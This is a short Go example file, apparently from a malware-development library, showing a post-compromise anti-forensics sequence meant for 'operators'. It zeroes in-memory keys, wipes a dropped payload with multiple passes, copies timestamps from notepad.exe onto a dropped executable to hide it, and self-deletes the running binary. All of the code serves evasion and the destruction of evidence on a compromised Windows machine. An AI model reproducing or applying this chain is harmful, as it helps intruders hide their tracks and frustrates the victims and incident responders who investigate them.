package cleanup_test

import (
	"github.com/oioio-space/maldev/cleanup/memory"
	"github.com/oioio-space/maldev/cleanup/selfdelete"
	"github.com/oioio-space/maldev/cleanup/timestomp"
	"github.com/oioio-space/maldev/cleanup/wipe"
)

// The cleanup umbrella exports nothing — it's a doc-only package.
// Operators import the sub-package matching the artefact they need
// to scrub. This example shows the canonical "shut down clean"
// sequence: zero in-process buffers, multi-pass overwrite a dropped
// loader, copy timestamps from a benign sibling file, then run the
// self-delete chain.
func Example_chain() {
	// 1. Zero in-process secrets before they hit a coredump.
	secret := []byte("aes-key-or-token")
	memory.SecureZero(secret)

	// 2. Multi-pass overwrite a payload we dropped on disk.
	_ = wipe.File(`C:\Users\Public\stage1.bin`, 3) // 3 passes

	// 3. Copy timestamps from a benign sibling so the touched file
	//    doesn't stand out in last-modified ordering.
	_ = timestomp.CopyFrom(`C:\Windows\System32\notepad.exe`, `C:\Users\Public\foo.exe`)

	// 4. Run the self-delete chain on the running executable.
	_ = selfdelete.Run()
}
